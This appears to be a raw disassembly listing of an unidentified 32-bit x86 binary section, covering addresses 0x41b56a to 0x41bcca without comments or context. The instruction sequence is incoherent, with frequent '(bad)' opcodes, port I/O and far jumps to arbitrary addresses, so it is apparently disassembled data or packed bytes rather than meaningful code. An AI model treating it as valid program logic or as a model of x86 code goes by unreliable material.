  41b56a:	fcmovne st,st(5)
  41b56c:	hlt    
  41b56d:	into   
  41b56e:	out    dx,eax
  41b56f:	xor    edx,ecx
  41b571:	imul   eax,DWORD PTR [ebp-0x384e1de],0xfffffff7
  41b578:	xor    esi,0x72
  41b57b:	repz jmp 0x2fad:0x714e222e
  41b583:	call   0x27a0a226
  41b588:	scas   al,BYTE PTR es:[edi]
  41b589:	(bad)  
  41b58a:	ja     0x41b5ed
  41b58c:	call   0x4a254d3b
  41b591:	test   DWORD PTR [edx+0x6e795c93],esp
  41b597:	(bad)  
  41b598:	pop    ss
  41b599:	call   0x8a41:0x29bbb5b7
  41b5a0:	mov    BYTE PTR [esi],0x94
  41b5a3:	or     eax,0x3d0b361d
  41b5a8:	scas   eax,DWORD PTR es:[edi]
  41b5a9:	stos   BYTE PTR es:[edi],al
  41b5aa:	in     eax,dx
  41b5ab:	cwde   
  41b5ac:	and    dh,ch
  41b5ae:	push   esp
  41b5af:	lock cmp eax,0xba9ee88e
  41b5b5:	test   BYTE PTR [eax+0x1bd8ac68],bl
  41b5bb:	xor    al,0x14
  41b5bd:	ret    
  41b5be:	or     DWORD PTR ds:0x6170842b,0x694bd797
  41b5c8:	jne    0x41b5c6
  41b5ca:	xchg   ebp,eax
  41b5cb:	cwde   
  41b5cc:	sub    edx,DWORD PTR [edx-0x4b]
  41b5cf:	or     BYTE PTR ds:0x57fd8165,0x6
  41b5d6:	mov    bl,bh
  41b5d8:	std    
  41b5d9:	inc    esp
  41b5da:	test   BYTE PTR [edi],0x42
  41b5dd:	inc    edx
  41b5de:	fstp   DWORD PTR [ecx]
  41b5e0:	sub    ebx,ebp
  41b5e2:	(bad)  
  41b5e3:	out    dx,al
  41b5e4:	jg     0x41b623
  41b5e6:	mov    esi,0x5aa76a50
  41b5eb:	mov    dl,0x4c
  41b5ed:	mov    al,ds:0x490f9ace
  41b5f2:	and    DWORD PTR [ecx],esp
  41b5f4:	ror    DWORD PTR [edx-0x52e7cf7a],cl
  41b5fa:	stc    
  41b5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5fc:	xchg   edx,eax
  41b5fd:	dec    ebp
  41b5fe:	enter  0xc72f,0x9d
  41b602:	or     eax,DWORD PTR ds:0x9992be2
  41b608:	pushw  es
  41b60a:	mov    cl,0xc
  41b60c:	and    al,0x8a
  41b60e:	in     eax,0x6
  41b610:	std    
  41b611:	inc    ecx
  41b612:	mov    BYTE PTR [edx-0x2344ab3a],cl
  41b618:	shr    BYTE PTR [edx],1
  41b61a:	sub    ebx,ebx
  41b61c:	adc    al,0xde
  41b61e:	cwde   
  41b61f:	in     eax,0xa6
  41b621:	or     DWORD PTR [ecx+0x4f],ebx
  41b624:	xchg   ebx,eax
  41b625:	shl    DWORD PTR [ecx+ecx*4+0x6a],cl
  41b629:	ss inc eax
  41b62b:	in     eax,0x62
  41b62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b62e:	mov    esp,0xb10920a1
  41b633:	fwait
  41b634:	jmp    0x96bba086
  41b639:	mov    ecx,ebp
  41b63b:	jge    0x41b677
  41b63d:	call   0xe31914ef
  41b642:	(bad)  
  41b643:	pushf  
  41b644:	out    0xc9,al
  41b646:	xchg   BYTE PTR [ebp+eax*8+0x4e030e76],cl
  41b64d:	hlt    
  41b64e:	(bad)  
  41b64f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b650:	call   0xa03fb882
  41b655:	cld    
  41b656:	jb     0x41b63d
  41b658:	arpl   di,ax
  41b65a:	push   eax
  41b65b:	not    BYTE PTR [eax-0x20ece3e5]
  41b661:	xor    BYTE PTR [edx],ah
  41b663:	das    
  41b664:	xor    eax,0x3819cd78
  41b669:	cs enter 0xfb76,0x65
  41b66e:	and    al,0xf1
  41b670:	sbb    cl,BYTE PTR ds:0x36113ed2
  41b676:	xchg   ebx,eax
  41b677:	mov    eax,0x6bc824e3
  41b67c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b67d:	imul   edi,DWORD PTR [esp+ebp*8-0x22],0x85b531e6
  41b685:	inc    esi
  41b686:	(bad)  
  41b687:	call   0x3bc1889a
  41b68c:	add    edi,DWORD PTR [edi]
  41b68e:	ret    0xda3
  41b691:	test   al,0x4e
  41b693:	aaa    
  41b694:	lods   eax,DWORD PTR ds:[esi]
  41b695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b696:	sbb    bl,BYTE PTR ds:0x49c6451a
  41b69c:	xchg   esi,eax
  41b69d:	scas   eax,DWORD PTR es:[edi]
  41b69e:	xchg   esi,eax
  41b69f:	call   0x23383f41
  41b6a4:	cs (bad) 
  41b6a6:	outs   dx,DWORD PTR ds:[esi]
  41b6a7:	data16 fist DWORD PTR [esi+0x76]
  41b6ab:	xchg   esi,eax
  41b6ac:	or     eax,0x1ca6e133
  41b6b1:	add    BYTE PTR [eax-0x49],ch
  41b6b4:	les    ebp,FWORD PTR [edi+edi*8-0x720f694f]
  41b6bb:	pop    esp
  41b6bc:	loopne 0x41b649
  41b6be:	test   eax,0x630e4145
  41b6c3:	jecxz  0x41b6b4
  41b6c5:	ficomp DWORD PTR [eax+0x53ff6e21]
  41b6cb:	adc    DWORD PTR [edx],0x29425aa0
  41b6d1:	mov    DWORD PTR [ecx],ecx
  41b6d3:	adc    al,0x47
  41b6d5:	and    eax,0x40d3bba7
  41b6da:	push   esp
  41b6db:	mov    edx,0xae2c61b6
  41b6e0:	mov    esp,0x22ffa3f3
  41b6e5:	inc    esi
  41b6e6:	lods   al,BYTE PTR ds:[esi]
  41b6e7:	fdivp  st(2),st
  41b6e9:	ds loope 0x41b67b
  41b6ec:	add    cl,BYTE PTR [ebp+0x40]
  41b6ef:	ins    BYTE PTR es:[edi],dx
  41b6f0:	inc    esp
  41b6f1:	arpl   WORD PTR [esp],bx
  41b6f4:	popf   
  41b6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f6:	push   edi
  41b6f7:	push   ss
  41b6f8:	pop    ebp
  41b6f9:	adc    eax,0x8780590c
  41b6fe:	pop    ebp
  41b6ff:	or     eax,0x1688f61a
  41b704:	ret    
  41b705:	and    eax,0x899da316
  41b70a:	imul   edi,DWORD PTR ds:0xde88df9f,0x34
  41b711:	xor    ebp,DWORD PTR [esp+ebp*1-0x5b]
  41b715:	jp     0x41b73d
  41b717:	imul   esp,edi,0x62
  41b71a:	sub    BYTE PTR [edx+eiz*4-0x33],cl
  41b71e:	sub    BYTE PTR [ebp+0x7a91f54b],ch
  41b724:	adc    dl,bh
  41b726:	je     0x41b6d4
  41b728:	nop
  41b729:	mov    al,ds:0x813cde51
  41b72e:	xor    ecx,ebx
  41b730:	popf   
  41b731:	inc    edx
  41b732:	xlat   BYTE PTR ds:[ebx]
  41b733:	pop    esp
  41b734:	add    ah,BYTE PTR [esi-0x3b9442ee]
  41b73a:	sub    BYTE PTR [eax-0x65],dl
  41b73d:	or     DWORD PTR [ecx+0x50b11c6c],edx
  41b743:	gs adc ah,0x5a
  41b747:	lock xor DWORD PTR [edi],0x46
  41b74b:	sbb    al,0xf1
  41b74d:	loop   0x41b744
  41b74f:	and    eax,0xd8bde3f5
  41b754:	mov    edx,0xe827d501
  41b759:	ds add al,0xe
  41b75c:	retf   0xb16d
  41b75f:	mov    ebx,0xdb2d0527
  41b764:	test   BYTE PTR [edx-0x57],dl
  41b767:	inc    ebx
  41b768:	sbb    esi,edx
  41b76a:	add    al,0xdc
  41b76c:	jnp    0x41b7e3
  41b76e:	loope  0x41b7bf
  41b770:	xchg   ebx,eax
  41b771:	pushf  
  41b772:	xchg   BYTE PTR [esi+eax*2-0x6],bl
  41b776:	popa   
  41b777:	push   ss
  41b778:	int    0x7d
  41b77a:	(bad)  
  41b77b:	in     eax,dx
  41b77c:	pop    edi
  41b77d:	scas   eax,DWORD PTR es:[edi]
  41b77e:	xor    DWORD PTR ds:0x515d5440,esp
  41b784:	imul   ebx,ebx,0x5e8f3d06
  41b78a:	ror    BYTE PTR [esi],1
  41b78c:	es and bh,bl
  41b78f:	xchg   edi,eax
  41b790:	das    
  41b791:	mov    BYTE PTR [eax+ebx*2+0x4d137023],bh
  41b798:	jge    0x41b7cd
  41b79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79b:	mov    dl,BYTE PTR ss:[ebx]
  41b79e:	mov    al,0x25
  41b7a0:	sbb    dh,ch
  41b7a2:	xchg   ebx,eax
  41b7a3:	popf   
  41b7a4:	(bad)  
  41b7a5:	aad    0x5c
  41b7a7:	repnz sbb ebx,DWORD PTR [eax-0x74]
  41b7ab:	mov    esp,esp
  41b7ad:	mov    ds,WORD PTR [ecx]
  41b7af:	stc    
  41b7b0:	stos   BYTE PTR es:[edi],al
  41b7b1:	lea    ecx,ds:0x8645b1bc
  41b7b7:	data16 arpl WORD PTR [edi],cx
  41b7ba:	lods   eax,DWORD PTR ds:[esi]
  41b7bb:	cmp    al,0xa3
  41b7bd:	imul   ecx,ebx,0xffffffe4
  41b7c0:	data16 addr16 es in al,dx
  41b7c4:	jmp    0x20cf5ea5
  41b7c9:	fistp  QWORD PTR [edi-0x6d70f9bd]
  41b7cf:	mov    ds:0x427952b4,al
  41b7d4:	jns    0x41b7a1
  41b7d6:	cwde   
  41b7d7:	pop    ss
  41b7d8:	pushf  
  41b7d9:	jmp    0x41b80e
  41b7db:	call   0x7a25:0x709317c7
  41b7e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e3:	out    dx,al
  41b7e4:	xchg   esp,eax
  41b7e5:	call   0x4bfcbb
  41b7ea:	bound  ecx,QWORD PTR [ebp-0x2c]
  41b7ed:	push   ds
  41b7ee:	test   DWORD PTR [ecx],edx
  41b7f0:	call   0x4138:0x5080467b
  41b7f7:	jmp    0xf707:0x788c10d3
  41b7fe:	xchg   edx,eax
  41b7ff:	mov    eax,ds:0xeafa1774
  41b804:	dec    ebp
  41b805:	out    0x6b,al
  41b807:	lahf   
  41b808:	inc    ebx
  41b809:	shr    BYTE PTR [ebx+0x68],0xea
  41b80d:	arpl   WORD PTR [ecx],dx
  41b80f:	and    eax,0x46bb2fa4
  41b814:	out    dx,eax
  41b815:	xchg   edx,eax
  41b816:	mov    al,0x4d
  41b818:	inc    esp
  41b819:	jbe    0x41b813
  41b81b:	dec    edi
  41b81c:	arpl   WORD PTR [ebp-0x2b],si
  41b81f:	retf   
  41b820:	fwait
  41b821:	ds std 
  41b823:	ss xor eax,0xcbf636c7
  41b829:	inc    ebp
  41b82a:	imul   ebp,edi,0xffffffd2
  41b82d:	sbb    eax,0xdff2e32
  41b832:	push   ss
  41b833:	xchg   edx,eax
  41b834:	mov    ah,al
  41b836:	(bad)  
  41b837:	lods   al,BYTE PTR gs:[esi]
  41b839:	test   bl,cl
  41b83b:	das    
  41b83c:	fcom   QWORD PTR [esp+edx*2+0x3e]
  41b840:	outs   dx,BYTE PTR ds:[esi]
  41b841:	pop    ss
  41b842:	je     0x41b813
  41b844:	fnstsw WORD PTR [eax+0x4821e4c7]
  41b84a:	or     cl,0xec
  41b84d:	retf   0xe26f
  41b850:	mov    ds:0xf211a9a4,eax
  41b855:	das    
  41b856:	lahf   
  41b857:	jb     0x41b81a
  41b859:	push   edx
  41b85a:	mov    cl,0xd6
  41b85c:	ret    0x3e8b
  41b85f:	add    edx,DWORD PTR cs:[eax]
  41b862:	cdq    
  41b863:	sub    BYTE PTR [eax],bh
  41b865:	jmp    0x9e19:0xca5bedce
  41b86c:	aad    0xdd
  41b86e:	dec    DWORD PTR [ebp-0x12f2dde3]
  41b874:	jns    0x41b810
  41b876:	cmc    
  41b877:	in     eax,0x40
  41b879:	sbb    eax,0xcbb8a603
  41b87e:	in     eax,0x2d
  41b880:	jo     0x41b8e1
  41b882:	add    DWORD PTR [esi],ecx
  41b884:	test   eax,0xbb3e9b62
  41b889:	unpckhps xmm3,XMMWORD PTR [edi-0x13]
  41b88d:	adc    DWORD PTR [edi],ecx
  41b88f:	pusha  
  41b890:	cs sti 
  41b892:	mov    bl,0x89
  41b894:	cmc    
  41b895:	outs   dx,BYTE PTR ds:[esi]
  41b896:	jmp    0x5d98:0x53874ca5
  41b89d:	mov    dl,BYTE PTR [edi]
  41b89f:	sub    BYTE PTR [eax+edi*4+0x19],0x5b
  41b8a4:	jecxz  0x41b8b4
  41b8a6:	out    0x86,al
  41b8a8:	sbb    ch,dl
  41b8aa:	clc    
  41b8ab:	push   ebp
  41b8ac:	shl    DWORD PTR ss:[edx+ecx*2+0x6d],1
  41b8b1:	jb     0x41b865
  41b8b3:	pop    es
  41b8b4:	das    
  41b8b5:	mov    eax,ds:0x2865022
  41b8ba:	or     al,0xdf
  41b8bc:	cwde   
  41b8bd:	xor    ah,bl
  41b8bf:	je     0x41b8af
  41b8c1:	mov    bh,0x6f
  41b8c3:	inc    ebx
  41b8c4:	sub    eax,ebp
  41b8c6:	int3   
  41b8c7:	inc    esp
  41b8c8:	cmp    ah,0x63
  41b8cb:	out    0xe1,eax
  41b8cd:	dec    edi
  41b8ce:	mov    eax,ds:0x7ca263b8
  41b8d3:	iret   
  41b8d4:	aam    0xc9
  41b8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8d7:	add    eax,0xe1722530
  41b8dc:	xor    edi,DWORD PTR [ebx+0x6ee764f2]
  41b8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8e3:	add    ecx,edx
  41b8e5:	mov    edx,0x9362eba9
  41b8ea:	outs   dx,DWORD PTR ds:[esi]
  41b8eb:	push   cs
  41b8ec:	ins    DWORD PTR es:[edi],dx
  41b8ed:	stc    
  41b8ee:	fwait
  41b8ef:	in     al,dx
  41b8f0:	mov    eax,0xb8b7ccc
  41b8f5:	aas    
  41b8f6:	adc    ch,BYTE PTR [edx-0x3fd6f53a]
  41b8fc:	dec    eax
  41b8fd:	xchg   ecx,eax
  41b8fe:	add    eax,ecx
  41b900:	mov    edi,0x151e0417
  41b905:	sbb    ebx,esp
  41b907:	in     eax,0x5f
  41b909:	call   0xa6b2:0x35060eae
  41b910:	mov    cl,0xb2
  41b912:	arpl   WORD PTR [ecx+ebx*4-0x3c],si
  41b916:	ret    0xbe53
  41b919:	retf   
  41b91a:	add    eax,0x76350dda
  41b91f:	leave  
  41b920:	or     BYTE PTR [edi+0x19],dh
  41b923:	out    0xa,eax
  41b925:	aam    0xc0
  41b927:	xchg   BYTE PTR [ebp-0x1a],dl
  41b92a:	pop    ebp
  41b92b:	loop   0x41b96b
  41b92d:	aas    
  41b92e:	dec    edx
  41b92f:	pop    edx
  41b930:	idiv   DWORD PTR [ebx-0x75ffdf01]
  41b936:	dec    edx
  41b937:	dec    edx
  41b938:	jo     0x41b9a5
  41b93a:	dec    ebx
  41b93b:	inc    esi
  41b93c:	sbb    al,0xba
  41b93e:	cs dec ebx
  41b940:	es mov dl,bh
  41b943:	out    dx,eax
  41b944:	pop    edi
  41b945:	cmp    BYTE PTR [edi+0x4c84160a],cl
  41b94b:	dec    esi
  41b94c:	test   eax,0x76916d66
  41b951:	mov    bl,0x9c
  41b953:	inc    ecx
  41b954:	sahf   
  41b955:	icebp  
  41b956:	and    DWORD PTR [edi],ecx
  41b958:	ds mov bh,0x1f
  41b95b:	les    edx,FWORD PTR [ecx-0x60]
  41b95e:	icebp  
  41b95f:	xchg   ecx,eax
  41b960:	rcl    DWORD PTR ds:0x27496156,0xce
  41b967:	xlat   BYTE PTR ds:[ebx]
  41b968:	stc    
  41b969:	xchg   bh,ah
  41b96b:	rol    esi,0x70
  41b96e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96f:	icebp  
  41b970:	cmp    eax,0x952fcb52
  41b975:	call   0x6937:0x7555ccd
  41b97c:	cdq    
  41b97d:	or     al,0xb4
  41b97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b980:	addr16 xchg edi,eax
  41b982:	pop    esi
  41b983:	loope  0x41b9e9
  41b985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b986:	dec    esp
  41b987:	and    BYTE PTR [ebx],ch
  41b989:	fs dec eax
  41b98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b98c:	imul   esp,DWORD PTR [ebp-0x55],0x8
  41b990:	xchg   DWORD PTR [esi],edx
  41b992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b993:	call   0xc0be29e5
  41b998:	fimul  WORD PTR [edx+edi*1]
  41b99b:	adc    DWORD PTR [esi],0xefbd9430
  41b9a1:	sbb    al,0xf2
  41b9a3:	das    
  41b9a4:	ret    
  41b9a5:	xchg   ecx,eax
  41b9a6:	xor    al,0xb0
  41b9a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9a9:	bound  esp,QWORD PTR [ebx]
  41b9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9ac:	dec    esi
  41b9ad:	in     eax,0x3f
  41b9af:	jo     0x41b9bf
  41b9b1:	sbb    BYTE PTR [edi-0x29307c42],bl
  41b9b7:	(bad)  
  41b9b8:	rcr    edx,1
  41b9ba:	push   esi
  41b9bb:	push   ebx
  41b9bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9bd:	xchg   edx,eax
  41b9be:	jne    0x41ba2d
  41b9c0:	pop    esi
  41b9c1:	out    dx,al
  41b9c2:	push   0xffffffd5
  41b9c4:	sub    eax,eax
  41b9c6:	mov    esi,0x295e99be
  41b9cb:	mov    eax,ds:0x3e6b059a
  41b9d0:	xchg   ebx,eax
  41b9d1:	pop    es
  41b9d2:	mov    dl,0x6
  41b9d4:	mov    ?,WORD PTR [eax-0x4d]
  41b9d7:	jl     0x41ba4b
  41b9d9:	and    BYTE PTR [esi],dh
  41b9db:	mov    edi,0x90817a3e
  41b9e0:	dec    edx
  41b9e1:	adc    DWORD PTR [ebx+0x16],ecx
  41b9e4:	in     eax,0xf2
  41b9e6:	call   0xcfdc:0x2359dc40
  41b9ed:	push   ebp
  41b9ee:	stc    
  41b9ef:	and    al,0x5e
  41b9f1:	ret    0xa205
  41b9f4:	sbb    al,0x3a
  41b9f6:	ss xchg edi,eax
  41b9f8:	add    dl,bl
  41b9fa:	jg     0x41ba07
  41b9fc:	sbb    esi,DWORD PTR [ebx+edx*8-0x61]
  41ba00:	hlt    
  41ba01:	bnd jle 0x41b985
  41ba04:	(bad)  
  41ba05:	xchg   ecx,eax
  41ba06:	psubq  mm1,mm5
  41ba09:	jge    0x41b9ab
  41ba0b:	add    eax,0x6c319517
  41ba10:	xchg   edx,eax
  41ba11:	add    edx,esp
  41ba13:	sub    bl,BYTE PTR ds:0xabb4e19d
  41ba19:	loopne 0x41ba7c
  41ba1b:	test   eax,0x4c6026ff
  41ba20:	popa   
  41ba21:	xor    BYTE PTR [esi-0x577c5d6e],ah
  41ba27:	pushf  
  41ba28:	fisubr WORD PTR [edi-0x1d]
  41ba2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2c:	or     esi,ecx
  41ba2e:	cmp    BYTE PTR [ebp+ebx*4-0x10a6e3bc],dh
  41ba35:	fild   WORD PTR [edi]
  41ba37:	add    al,0x1a
  41ba39:	add    esp,ecx
  41ba3b:	push   es
  41ba3c:	outs   dx,BYTE PTR ds:[esi]
  41ba3d:	push   ecx
  41ba3e:	loope  0x41ba5b
  41ba40:	add    eax,0xe8fa9db1
  41ba45:	xchg   ebp,eax
  41ba46:	popf   
  41ba47:	push   eax
  41ba48:	scas   eax,DWORD PTR es:[edi]
  41ba49:	pop    ebp
  41ba4a:	add    DWORD PTR [eax],ebp
  41ba4c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41ba4e:	lods   al,BYTE PTR ds:[esi]
  41ba4f:	sbb    al,0x8f
  41ba51:	stos   DWORD PTR es:[edi],eax
  41ba52:	(bad)  
  41ba53:	not    BYTE PTR [ebx-0x61a39db9]
  41ba59:	mov    eax,0xeadff28a
  41ba5e:	into   
  41ba5f:	push   edi
  41ba60:	sub    bh,dh
  41ba62:	inc    esi
  41ba63:	jmp    DWORD PTR [edx]
  41ba65:	retf   
  41ba66:	xor    eax,0xa2969fa6
  41ba6b:	pop    ebx
  41ba6c:	mov    bl,0xad
  41ba6e:	inc    esi
  41ba6f:	mov    bh,0x6
  41ba71:	fxch   st(6)
  41ba73:	retf   0x6179
  41ba76:	sub    dh,bh
  41ba78:	mov    BYTE PTR [ebx-0x7d],ch
  41ba7b:	stos   DWORD PTR es:[edi],eax
  41ba7c:	push   ss
  41ba7d:	mov    ds:0x28daf72f,al
  41ba82:	shr    eax,cl
  41ba84:	call   0x8304be10
  41ba89:	retf   
  41ba8a:	inc    ecx
  41ba8b:	sahf   
  41ba8c:	fst    DWORD PTR [esi+ebx*4]
  41ba8f:	bound  esi,QWORD PTR [eax]
  41ba91:	(bad)  
  41ba94:	sbb    eax,0x5a01448f
  41ba99:	sbb    BYTE PTR [ebp-0x67],ch
  41ba9c:	test   DWORD PTR [edx+0x4588eb9a],ebx
  41baa2:	dec    edx
  41baa3:	(bad)  
  41baa4:	xchg   edi,eax
  41baa5:	mov    esi,0xcd886384
  41baaa:	loopne 0x41baf1
  41baac:	pop    esi
  41baad:	gs ret 
  41baaf:	push   DWORD PTR ss:[edx]
  41bab2:	popf   
  41bab3:	scas   al,BYTE PTR es:[edi]
  41bab4:	addr16 aas 
  41bab6:	enter  0x8ff1,0x9a
  41baba:	sbb    dh,0xf1
  41babd:	pop    edi
  41babe:	lds    ebp,FWORD PTR [edx+edx*1]
  41bac1:	xor    DWORD PTR [ebx],edi
  41bac3:	ins    DWORD PTR es:[edi],dx
  41bac4:	cmp    BYTE PTR [edi],cl
  41bac6:	jecxz  0x41bae8
  41bac8:	int    0x1f
  41baca:	xlat   BYTE PTR ds:[ebx]
  41bacb:	push   edx
  41bacc:	push   esi
  41bacd:	popf   
  41bace:	call   0xdcf7e74f
  41bad3:	shr    DWORD PTR [edx-0x21],0xb9
  41bad7:	cmp    al,BYTE PTR [eax-0x75c08664]
  41badd:	jmp    0xe77f:0x25141bff
  41bae4:	in     al,0xaf
  41bae6:	inc    eax
  41bae7:	add    cl,ch
  41bae9:	ret    
  41baea:	xchg   ecx,eax
  41baeb:	and    al,0x9c
  41baed:	mov    al,ds:0x2daed9e9
  41baf2:	xor    BYTE PTR [edi+0x65],ch
  41baf5:	enter  0x8b6a,0x29
  41baf9:	pop    ebx
  41bafa:	jno    0x41bb4c
  41bafc:	jnp    0x41bb52
  41bafe:	sub    BYTE PTR [edx-0x5fb5dc8],al
  41bb04:	mov    al,ds:0x9045bb7
  41bb09:	cmp    ch,BYTE PTR [ebp-0x490e4ca6]
  41bb0f:	add    dh,BYTE PTR [esi+0x5884287d]
  41bb15:	and    bh,BYTE PTR [edx]
  41bb17:	cmp    eax,0xf0513384
  41bb1c:	pop    edi
  41bb1d:	push   ebx
  41bb1e:	sbb    al,BYTE PTR [eax]
  41bb20:	and    ebx,DWORD PTR [ecx]
  41bb22:	add    BYTE PTR ds:0x5bdceb6,ah
  41bb28:	into   
  41bb29:	lods   eax,DWORD PTR ds:[esi]
  41bb2a:	(bad)  
  41bb2b:	in     al,0x61
  41bb2d:	inc    ecx
  41bb2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb2f:	shl    BYTE PTR [eax+0x9d43fa4],0x2
  41bb36:	jb     0x41bb94
  41bb38:	push   ecx
  41bb39:	push   ss
  41bb3a:	shl    DWORD PTR [ebp+0x555d44a6],cl
  41bb40:	fadd   DWORD PTR [eax+edi*8-0x55798a55]
  41bb47:	pop    ebx
  41bb48:	sub    eax,0xb982ab97
  41bb4d:	ss inc edx
  41bb4f:	jmp    0x723:0x330e1862
  41bb56:	cmp    dh,BYTE PTR ds:[esi]
  41bb59:	pusha  
  41bb5a:	lea    esi,[eax+0x36]
  41bb5d:	inc    esi
  41bb5e:	dec    ebp
  41bb5f:	call   FWORD PTR [ebx+0x1c]
  41bb62:	mov    edx,?
  41bb64:	and    ch,al
  41bb66:	jno    0x41bb22
  41bb68:	mov    di,0x3eb9
  41bb6c:	xchg   esi,eax
  41bb6d:	mov    bl,0x70
  41bb6f:	in     eax,0x48
  41bb71:	stos   BYTE PTR es:[edi],al
  41bb72:	or     ch,BYTE PTR [esi]
  41bb74:	fstp   TBYTE PTR [ecx-0x1]
  41bb77:	add    DWORD PTR [esi+esi*2],edx
  41bb7a:	jecxz  0x41bb20
  41bb7c:	sahf   
  41bb7d:	loopne 0x41bb18
  41bb7f:	sub    bl,BYTE PTR [eax-0x60]
  41bb82:	mov    ds:0xe3ed199c,eax
  41bb87:	jbe    0x41bbe4
  41bb89:	jge    0x41bbca
  41bb8b:	fdiv   st(7),st
  41bb8d:	sub    BYTE PTR [ecx+0x774f22ea],0x83
  41bb94:	inc    eax
  41bb95:	or     eax,0x9facc1ff
  41bb9a:	pushf  
  41bb9b:	or     BYTE PTR [ebp-0x36],ah
  41bb9e:	addr16 mov bl,al
  41bba1:	inc    esi
  41bba2:	daa    
  41bba3:	(bad)  
  41bba4:	(bad)  
  41bba6:	cmp    ebp,DWORD PTR [eax-0x1e7444b3]
  41bbac:	(bad)  
  41bbad:	push   cs
  41bbae:	mov    DWORD PTR [ebx+eiz*4+0x29],esp
  41bbb2:	iret   
  41bbb3:	push   cs
  41bbb4:	mov    dh,0xa1
  41bbb6:	or     al,0x42
  41bbb8:	into   
  41bbb9:	pop    esi
  41bbba:	jae    0x41bb42
  41bbbc:	jno    0x41bbf7
  41bbbe:	pop    edi
  41bbbf:	pop    edi
  41bbc0:	jl     0x41bbc9
  41bbc2:	int3   
  41bbc3:	in     eax,dx
  41bbc4:	xchg   ebp,eax
  41bbc5:	xchg   edx,eax
  41bbc6:	jo     0x41bbaf
  41bbc8:	fist   WORD PTR [ecx-0x6e]
  41bbcb:	ret    0xb46d
  41bbce:	setl   BYTE PTR [ebp+0x7263f14c]
  41bbd5:	jecxz  0x41bb8b
  41bbd7:	push   ds
  41bbd8:	cmp    BYTE PTR [eiz*1+0x5fbd4c04],ch
  41bbdf:	(bad)  
  41bbe0:	push   0x84cbdff3
  41bbe5:	push   ebx
  41bbe6:	mov    BYTE PTR [edx+0x7f64e682],ch
  41bbec:	int    0x25
  41bbee:	adc    eax,0xfd3bc1c7
  41bbf3:	js     0x41bc5e
  41bbf5:	jle    0x41bc60
  41bbf7:	hlt    
  41bbf8:	adc    eax,0xa080f574
  41bbfd:	mov    al,ds:0x70270cb4
  41bc02:	popa   
  41bc03:	cdq    
  41bc04:	ds mov ebx,0xf0e341c6
  41bc0a:	(bad)  
  41bc0b:	ins    BYTE PTR es:[edi],dx
  41bc0c:	imul   edi,DWORD PTR [ebx],0x9ad4b5c2
  41bc12:	pop    es
  41bc13:	pop    esp
  41bc14:	jmp    FWORD PTR es:[ebx]
  41bc17:	dec    ecx
  41bc18:	cli    
  41bc19:	addr16 mov ?,ebp
  41bc1c:	sub    al,0x95
  41bc1e:	jp     0x41bc6a
  41bc20:	fsubr  st(4),st
  41bc22:	jp     0x41bc36
  41bc24:	add    BYTE PTR [ebp-0x7b3863b9],cl
  41bc2a:	jno    0x41bca6
  41bc2c:	jmp    0x628ea725
  41bc31:	test   al,0x63
  41bc33:	fst    QWORD PTR [ecx-0x7b]
  41bc36:	pop    ebp
  41bc37:	int    0x7d
  41bc39:	mov    edi,0x1f6e4faf
  41bc3e:	mov    cl,0xdb
  41bc40:	scas   al,BYTE PTR es:[edi]
  41bc41:	pop    ebp
  41bc42:	enter  0x2450,0xe2
  41bc46:	mov    bh,0x96
  41bc48:	into   
  41bc49:	ja     0x41bc7d
  41bc4b:	pop    edi
  41bc4c:	and    dh,BYTE PTR [esi-0x6dda6fc2]
  41bc52:	mov    ds:0xb0c92a9c,al
  41bc57:	mov    edx,0x84ae0f70
  41bc5c:	xchg   esp,eax
  41bc5d:	je     0x41bc3a
  41bc5f:	push   ecx
  41bc60:	jae    0x41bbfe
  41bc62:	pop    edx
  41bc63:	jg     0x41bc33
  41bc65:	jmp    0x41bce5
  41bc67:	mov    al,ds:0x385875bc
  41bc6c:	jo     0x41bbf1
  41bc6e:	(bad)  
  41bc6f:	out    0xa0,al
  41bc71:	mov    edx,0x3338b205
  41bc76:	mov    al,0x42
  41bc78:	mov    ?,WORD PTR ds:0x9b302087
  41bc7e:	sar    DWORD PTR [ebp+edx*8+0x38fdacb4],cl
  41bc85:	pop    esi
  41bc86:	inc    ebx
  41bc87:	inc    esp
  41bc88:	mov    al,0x68
  41bc8a:	cmp    eax,0x677f5568
  41bc8f:	mov    eax,0xca7cab80
  41bc94:	lahf   
  41bc95:	or     BYTE PTR [edx],0xaa
  41bc98:	out    dx,al
  41bc99:	pop    esi
  41bc9a:	ja     0x41bc98
  41bc9c:	out    dx,eax
  41bc9d:	mov    edx,0x7be2b843
  41bca2:	inc    eax
  41bca3:	dec    ebx
  41bca4:	mov    ds,WORD PTR [esi+0x2cc57998]
  41bcaa:	bound  edi,QWORD PTR [ebp-0x418aa96]
  41bcb0:	jb     0x41bcbc
  41bcb2:	out    0xfa,eax
  41bcb4:	div    DWORD PTR [edx-0x528199a9]
  41bcba:	dec    ebp
  41bcbb:	ret    
  41bcbc:	pop    edi
  41bcbd:	pop    es
  41bcbe:	push   edi
  41bcbf:	sbb    DWORD PTR [ebx],ebp
  41bcc1:	sti    
  41bcc2:	pop    esi
  41bcc3:	icebp  
  41bcc4:	mov    ch,0x92
  41bcc6:	(bad)  
  41bcc8:	nop
  41bcc9:	int3   
  41bcca:	fstp   DWORD PTR [edx+0x35]
